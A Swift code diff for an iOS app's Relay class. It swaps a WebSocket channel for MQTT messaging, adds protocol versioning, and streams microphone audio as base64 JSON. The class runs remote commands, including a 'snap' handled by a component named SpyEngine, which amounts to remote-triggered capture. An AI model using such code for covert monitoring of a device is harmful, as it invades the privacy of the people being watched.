@@ -4,9 +4,9 @@ import UIKit
 
 final class Relay {
     static let shared = Relay()
-    private var task: URLSessionWebSocketTask?
     private let audioQ = DispatchQueue(label: "relay.audio")
     private let down = Downsampler()
+    private let proto = 1
 
     func connect() {
         Mqtt.shared.onPayload = { [weak self] raw in
@@ -19,30 +19,10 @@ final class Relay {
         Mqtt.shared.start()
     }
 
-    private func ping() {
-        task?.sendPing { [weak self] err in
-            if err != nil { HealthMon.fail(.pushAlerts, "Relay unreachable") }
-            else { Outbox.shared.flush() }
-        }
-        DispatchQueue.main.asyncAfter(deadline: .now() + 15) { self.ping() }
-    }
-
-    private func listen() {
-        task?.receive { [weak self] res in
-            defer { self?.listen() }
-            guard case .success(let msg) = res else {
-                DispatchQueue.main.asyncAfter(deadline: .now() + 3) { self?.connect() }
-                return
-            }
-            guard case .string(let raw) = msg,
-                  let plain = Cipher.open(raw),
-                  let m = try? JSONSerialization.jsonObject(with: Data(plain.utf8)) as? [String: Any]
-            else { return }
-            self?.handle(m)
-        }
-    }
-
     private func handle(_ m: [String: Any]) {
+        if let p = m["proto"] as? Int, p > proto {
+            HealthMon.fail(.pushAlerts, "payload proto \(p) newer than \(proto)")
+        }
         if let d = m["dev"] as? String, d != Dev.id { return }
         switch m["cmd"] as? String {
         case "snap":       SpyEngine.shared.snap()
@@ -69,6 +49,7 @@ final class Relay {
 
     func sendJSON(_ o: [String: Any], log: Bool = true) {
         var body = o
+        body["proto"] = proto
         if body["dev"] == nil { body["dev"] = Dev.id }
         if log { Hist.append(body) }
         guard let d = try? JSONSerialization.data(withJSONObject: body),
@@ -84,7 +65,8 @@ final class Relay {
             let n = Int(small.frameLength)
             var pcm = [Int16](repeating: 0, count: n)
             for i in 0..<n { pcm[i] = Int16(max(-1, min(1, ch[i])) * 32767) }
-            self.task?.send(.data(pcm.withUnsafeBufferPointer { Data(buffer: $0) })) { _ in }
+            let data = pcm.withUnsafeBufferPointer { Data(buffer: $0) }
+            self.sendJSON(["type": "pcm", "b64": data.base64EncodedString()], log: false)
         }
     }
 
